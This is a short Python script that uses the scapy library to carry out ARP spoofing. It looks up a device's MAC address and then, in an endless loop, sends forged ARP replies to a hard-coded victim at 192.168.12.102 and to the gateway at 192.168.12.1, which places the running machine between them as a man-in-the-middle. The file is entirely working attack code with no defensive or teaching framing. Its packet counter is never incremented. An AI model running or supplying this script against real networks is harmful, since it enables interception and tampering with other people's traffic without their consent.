import time
import scapy.all as scapy


def get_mac(ip: str) -> str:
    '''returns a target device MAC address by sending a packet to a target ip'''
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip: str, spoof_ip: str) -> None:
    '''spoof the device by sending a fake arp packet'''
    target_mac = get_mac(target_ip) # getting a target mac addr using ip
    # creating fake arp packet
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False) # sending a packet
    

sent_packets_count = 0
while True:
    # sending arp packets to victim
    spoof("192.168.12.102", "192.168.12.1")
    # sending arp packets to gateway
    spoof("192.168.12.1", "192.168.12.102")
    print(f"[+] Packets Sent: {sent_packets_count}")
    time.sleep(2)